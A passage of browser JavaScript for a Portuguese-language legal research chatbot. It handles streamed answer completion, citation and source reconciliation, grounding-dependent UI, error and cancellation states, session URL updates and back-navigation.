                                        true,
                                        accumulatedText,
                                        pendingMeta
                                    );
                                }
                            }
                        },
                        async (doneData) => {
                            if (streamElements?.cancelledByUser) return;
                            window.JurixChatRenderer?.clearPendingAnswer?.(streamElements?.pendingAnswer);
                            if (streamElements) streamElements.pendingAnswer = null;
                            doneData = doneData && typeof doneData === 'object' ? doneData : {};
                            const messageScroller = document.getElementById('messages-container');
                            const wasFollowingLatest = Boolean(messageScroller)
                                && messageScroller.scrollHeight - messageScroller.scrollTop - messageScroller.clientHeight < 160;
                            chatState?.transition?.('finalizing', { question });
                            const finalAnswer = doneData.answer || accumulatedText;
                            const answerSources = doneData.grounded === true
                                ? (Array.isArray(doneData.sources) ? doneData.sources : finalSources)
                                : [];
                            const reasonCode = doneData.reason_code || doneData.contract?.reason_code || '';
                            if (streamElements?.messageBody) streamElements.messageBody._citationSources = answerSources;
                            if (streamElements && window.JurixRagUI) {
                                const expectedCitationCount = (String(finalAnswer).match(/\[\[\d{1,3}\]\]/g) || []).length;
                                const renderedCitationCount = streamElements.messageBody
                                    ?.querySelectorAll('.jurix-citation[data-source-index]').length || 0;
                                // A scheduled stream render can commit its final text before the
                                // citation source map is attached. Reconcile when the terminal
                                // answer differs, a citation is unresolved, or grounding rejects
                                // previously rendered source links.
                                if (
                                    accumulatedText !== finalAnswer
                                    || renderedCitationCount < expectedCitationCount
                                    || (doneData.grounded !== true && renderedCitationCount > 0)
                                ) {
                                    window.JurixRagUI.setCitationSources(streamElements.messageBody, answerSources);
                                    window.JurixRagUI.flushRender(streamElements.messageBody, finalAnswer);
                                }
                                window.JurixRagUI.linkLegalReferences(streamElements.messageBody, answerSources);
                                window.JurixRagUI.setStreamingState(streamElements.messageBody, false);
                                window.JurixRagUI.announce(doneData.grounded === true
                                    ? 'Resposta concluída.'
                                    : finalSources.length > 0
                                        ? 'As fontes localizadas não foram suficientes para confirmar a resposta.'
                                        : 'Não localizei fontes correspondentes no acervo consultado.');
                            }
                            if (streamElements?.sourcesContainer && answerSources.length > 0) {
                                const finalSourceMeta = {
                                    ...(streamElements.sourcesContainer._pendingSourcesMeta || {}),
                                    pending: false,
                                };
                                showSourcesGradually(
                                    streamElements.sourcesContainer,
                                    answerSources,
                                    true,
                                    finalAnswer,
                                    finalSourceMeta
                                );
                                const pill = streamElements.sourcesContainer.querySelector('.jurix-sources-pill-btn');
                                const badge = pill?.querySelector('.jurix-sources-pill-badge');
                                const hasSyntheticFixture = answerSources.some(
                                    (source) => source?.synthetic_fixture === true
                                );
                                if (badge) {
                                    badge.textContent = hasSyntheticFixture
                                        ? 'Fixture sintética de QA'
                                        : 'Fontes associadas à resposta';
                                }
                                if (pill) pill._sourcesMeta = { ...(pill._sourcesMeta || {}), pending: false };
                                streamElements.sourcesContainer._sourcesMeta = { ...(streamElements.sourcesContainer._sourcesMeta || {}), pending: false };
                                window.JurixRagUI?.reconcileSourcesDrawer?.(
                                    answerSources,
                                    'Fontes Consultadas',
                                    streamElements.sourcesContainer._sourcesMeta
                                );
                                window.JurixRagUI?.updateSourcesDrawerMetadata?.({ pending: false });
                            } else if (streamElements?.sourcesContainer) {
                                window.JurixRagUI?.clearSourcesDrawer?.();
                                streamElements.sourcesContainer.replaceChildren();
                                streamElements.sourcesContainer._sourcesData = [];
                                window.JurixRagUI?.setCitationSources?.(streamElements.messageBody, []);
                                window.requestAnimationFrame(() => {
                                    if (window.JurixRagUI) window.JurixRagUI.enhanceSources(streamElements.sourcesContainer);
                                });
                            }
                            const canRevealAnswerActions = doneData.grounded === true && answerSources.length > 0;
                            if (streamElements && canRevealAnswerActions) {
                                if (streamElements.copyButton) {
                                    streamElements.copyButton.setAttribute('data-markdown', finalAnswer);
                                    streamElements.copyButton.classList.add('show');
                                }
                                if (streamElements.regenerateBtn && typeof currentSessionId === 'number') {
                                    streamElements.regenerateBtn.classList.remove('is-hidden');
                                    streamElements.regenerateBtn.classList.add('show');
                                    streamElements.regenerateBtn.addEventListener('click', async () => {
                                        await regenerateLastResponse(currentSessionId, streamElements.messageDiv, streamElements.sourcesContainer);
                                    });
                                }
                            }
                            if (['norm_not_in_corpus', 'requested_device_not_in_corpus', 'norm_content_not_in_corpus'].includes(reasonCode)) {
                                appendNormLookupActions(streamElements?.messageDiv, question);
                            }
                            if (doneData.session_id) {
                                currentSessionId = doneData.session_id;
                                if (chatState && typeof chatState.setSessionId === 'function') {
                                    chatState.setSessionId(doneData.session_id);
                                }
                                if (wasNewSession && pendingSessionClientId) {
                                    window.JurixSidebar?.reconcilePending?.(pendingSessionClientId, doneData);
                                }
                                if (doneData.session_slug) {
                                    const sessionUrl = `${config.chatbotUrl}${doneData.session_slug}/`;
                                    const archiveQa = document.body?.dataset.qaArchiveCorpus === 'true'
                                        || new URLSearchParams(window.location.search).get('corpus') === 'archive-qa';
                                    window.history.replaceState({}, '', archiveQa ? `${sessionUrl}?corpus=archive-qa` : sessionUrl);
                                }
                                if (wasNewSession) animateSessionCreated();
                                await loadChatSessions();
                                if (wasNewSession) pendingSessionClientId = null;
                                updateNewChatButtonState();
                            }
                            chatState?.transition?.('completed', { question });
                            // Final citation linking, source-state updates and the
                            // completed composer can change message geometry after
                            // the last streamed chunk. Keep the newest evidence
                            // affordance visible when the reader was following the
                            // response, but do not pull someone back from older text.
                            window.requestAnimationFrame(() => {
                                window.requestAnimationFrame(() => {
                                    if (wasFollowingLatest) {
                                        const sourcePill = streamElements?.sourcesContainer
                                            ?.querySelector('.jurix-sources-pill-btn');
                                        const copyButton = streamElements?.copyButton;
                                        revealMessageControl(sourcePill || copyButton);
                                    } else {
                                        scrollToBottomIfAtBottom();
                                    }
                                });
                            });
                        },
                        (errorMsg) => {
                            window.JurixChatRenderer?.clearPendingAnswer?.(streamElements?.pendingAnswer);
                            if (streamElements) streamElements.pendingAnswer = null;
                            chatState.transition('failed', { error: errorMsg });
                        },
                        (status) => {
                            if (status === 'finalizing') {
                                chatState?.transition?.('finalizing', { question });
                            }
                            window.JurixChatController?.setPipelineStatus?.(status);
                        },
                        isRetry,
                        retryOfTurnId
                    );
                } catch (streamError) {
                    window.JurixChatController?.setPipelineStatus?.('failed');
                    if (pendingSessionClientId) {
                        window.JurixSidebar?.markPendingFailed?.(pendingSessionClientId);
                    }
                    if (streamError.name === 'AbortError') {
                        // Keep the user question and partial draft visible. A local
                        // AbortController request is not proof of remote cancellation.
                    } else {
                        window.JurixChatRenderer?.clearPendingAnswer?.(streamElements?.pendingAnswer);
                        if (streamElements) streamElements.pendingAnswer = null;
                        if (streamElements?.messageBody && window.JurixRagUI) {
                            const errorBox = document.createElement('div');
                            streamElements.messageDiv.appendChild(errorBox);
                            window.JurixRagUI.setStreamingState(streamElements.messageBody, false);
                            window.JurixRagUI.renderErrorState(errorBox, streamError, () => {
                                errorBox.remove();
                                if (chatState && typeof chatState.isBusy === 'function' && chatState.isBusy()) {
                                    chatState.transition('idle');
                                }
                                if (typeof currentSessionId === 'number') {
                                    regenerateLastResponse(currentSessionId, streamElements.messageDiv, streamElements.sourcesContainer);
                                    return;
                                }
                                retryingExistingQuestion = question;
                                streamElements.messageDiv.remove();
                                textarea.value = question;
                                window.JurixChatShell?.updateCounter();
                                focusComposerSafely(textarea);
                                if (typeof chatForm.requestSubmit === 'function') chatForm.requestSubmit();
                                else chatForm.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
                            });
                            window.requestAnimationFrame(() => {
                                scrollToBottom();
                                window.requestAnimationFrame(() => revealMessageControl(errorBox.querySelector('.jurix-rag-retry')));
                            });
                        } else {
                            addErrorMessage('Não foi possível concluir a pesquisa.');
                        }
                    }
                } finally {
                    // SSE callbacks may already be unwinding when a stop click races
                    // the terminal event. Reapply the cancelled presentation last so
                    // stale completion UI cannot relabel or expose unvalidated sources.
                    if (streamElements?.cancelledByUser) {
                        markStreamEvidenceCancelled(streamElements);
                    }
                    chatState.transition('idle');
                    if (streamElements?.retryButton) streamElements.retryButton.disabled = false;
                    activeStreamElements = null;
                    activeStreamQuestion = '';
                    if (sendButton) sendButton.disabled = false;
                    focusComposerSafely(textarea);
                }
            });
        }

        window.addEventListener('popstate', async () => {
            const thisSeq = ++navSeq;
            if (chatState && typeof chatState.isBusy === 'function' && chatState.isBusy()) {
                chatAPI?.cancelStream?.();
                chatState.transition('idle');
            }
            const sessionSlug = getSessionSlugFromPath();
            if (sessionSlug) {
                try {
                    const data = await chatAPI.getSessionBySlug(sessionSlug);
                    if (thisSeq !== navSeq) return;
                    if (data && data.success && data.session) {
                        await loadSession(data.session.id, false, thisSeq);
                        if (thisSeq !== navSeq) return;
                        await loadChatSessions();
                        return;
                    }
                } catch (error) {
                    if (thisSeq !== navSeq) return;
                    console.error('Error handling popstate navigation:', error);
                }
            } else {
                if (thisSeq !== navSeq) return;
                await createNewSession(false, thisSeq);
            }
        });
    }

    // Attach lifecycle listeners
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            setupEventListeners();
            initializeChatbot();
        });
    } else {
        setupEventListeners();
        initializeChatbot();
    }

    // Global namespace export
    window.jurixChat = {
        loadSession,
        createNewSession,
        deleteSession,
        askQuestion,
        getCurrentSessionId: () => currentSessionId,
        getNavSeq: () => navSeq,
    };
})();
